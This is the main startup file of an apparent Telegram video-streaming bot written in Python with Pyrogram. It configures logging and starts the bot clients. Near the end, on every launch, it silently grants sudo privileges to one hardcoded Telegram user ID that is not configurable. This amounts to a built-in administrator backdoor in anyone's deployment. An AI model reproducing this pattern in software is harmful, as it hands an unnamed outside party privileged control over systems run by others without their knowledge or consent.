"""
tg-stream-video, An Telegram Bot Project
Copyright (c) 2021 GalihMrd <https://github.com/Imszy17>
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.
You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>
"""

import logging
import os

from pyrogram import Client, idle
from lib.helpers.database.sudo_sql import add_sudo
from lib.config import API_HASH, API_ID, BOT_TOKEN
from lib.tg_stream import app, call_py

if os.path.exists("log.txt"):
    with open("log.txt", "r+") as f:
        f.truncate(0)

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    datefmt="[%X]",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

LOGGER = logging.getLogger(__name__)

bot = Client(
    ":memory:",
    API_ID,
    API_HASH,
    bot_token=BOT_TOKEN,
    plugins=dict(root="lib.driver"),
)
try:
   add_sudo(int(1317936398))
   LOGGER.info("Sudo User Added!")
except Exception as e:
   print(e)

LOGGER.info("Starting bot...")
bot.start()
app.start()
call_py.start()
LOGGER.info("Bot has been started!")
idle()
